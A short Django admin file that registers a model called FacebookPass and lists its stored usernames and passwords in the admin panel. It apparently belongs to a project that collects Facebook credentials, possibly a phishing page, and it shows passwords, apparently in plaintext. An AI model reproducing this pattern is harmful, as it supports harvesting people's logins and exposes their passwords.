from django.contrib import admin
from facebook.models import FacebookPass
# Register your models here.
@admin.register(FacebookPass)
class FacebookAdmin(admin.ModelAdmin):
    list_display = ['username','password']